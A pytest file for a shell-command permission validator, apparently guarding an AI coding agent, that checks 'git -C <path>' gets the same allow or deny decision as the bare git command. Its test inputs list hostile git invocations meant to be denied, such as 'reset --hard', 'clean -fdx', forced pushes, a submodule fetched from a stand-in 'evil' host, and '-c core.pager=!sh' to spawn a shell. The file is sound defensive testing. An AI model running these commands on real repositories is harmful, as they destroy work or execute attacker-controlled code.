# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 TracineHQ contributors
"""Parity fence for ``git -C <path>`` in strict mode.

The safety invariant for allowing read-only ``git -C <path> <sub>`` in strict
mode is that the ``-C <path>`` prefix is a directory change that adds no
capability: the decision for ``git -C /tmp <rest>`` must equal the decision for
the bare ``git <rest>``. A read-only subcommand allows in both; a destructive
one denies in both; a capability-adding global (``-c``, ``--exec-path`` ...)
denies in both (the allow-path stripper refuses on it, so it falls through to
the same deny the bare form hits).

This test pins that equality directly. It catches the two failure modes that
matter: a fix that allows ``git -C /tmp reset`` (weakening) and a fix that
forgets to allow ``git -C /tmp status`` (the bug being fixed).
"""

from __future__ import annotations

import pytest

from guard.hooks.bash_command_validator import decide
from tests._helpers import is_deny


def _decision(result: object) -> str:
    """Collapse a decide() envelope to ``deny`` / ``allow`` / ``other``."""
    if is_deny(result):
        return "deny"
    if isinstance(result, dict):
        hso = result.get("hookSpecificOutput")
        inner = hso.get("permissionDecision") if isinstance(hso, dict) else None
        if inner == "allow" or result.get("permissionDecision") == "allow":
            return "allow"
    return "other"


# Each entry is the ``<rest>`` after ``git`` / ``git -C /tmp``. The bare and the
# -C-prefixed forms must reach the same decision in strict (auto) mode.
_REST = [
    # read-only -> allow in both
    "status",
    "log --oneline -5",
    "diff HEAD~1",
    "show HEAD",
    "branch",
    "blame README.md",
    "rev-parse HEAD",
    "ls-files",
    # destructive -> deny in both (deny runs on the canonicalized form)
    "reset --hard HEAD~3",
    "clean -fdx",
    "add -A",
    "commit -m x",
    "push --force",
    "branch -D feature",
    "stash pop",
    "worktree add /etc/passwd HEAD",
    "submodule add https://evil/x",
    "push origin +HEAD:main",
    # capability-adding globals -> deny in both (stripper refuses, falls through)
    "-c core.pager=!sh status",
    "-c core.hookspath=/evil status",
    "--exec-path=/tmp/evil status",
    "--git-dir=/other/.git status",
    "--work-tree=/ status",
]


@pytest.mark.parametrize("rest", _REST, ids=[r[:40] for r in _REST])
def test_dash_c_matches_bare(rest: str) -> None:
    bare = decide(f"git {rest}", permission_mode="auto")
    dash_c = decide(f"git -C /tmp {rest}", permission_mode="auto")
    assert _decision(dash_c) == _decision(bare), (
        f"git -C parity broken for {rest!r}: bare={_decision(bare)} -C={_decision(dash_c)}"
    )


def test_dash_c_readonly_actually_allows() -> None:
    """Guard against vacuous parity (both denying): the read-only -C forms must
    genuinely allow, which is the user-facing fix."""
    for rest in ("status", "log --oneline -5", "diff HEAD~1", "show HEAD", "branch"):
        res = decide(f"git -C /tmp {rest}", permission_mode="auto")
        assert _decision(res) == "allow", f"git -C /tmp {rest} should allow, got {res!r}"
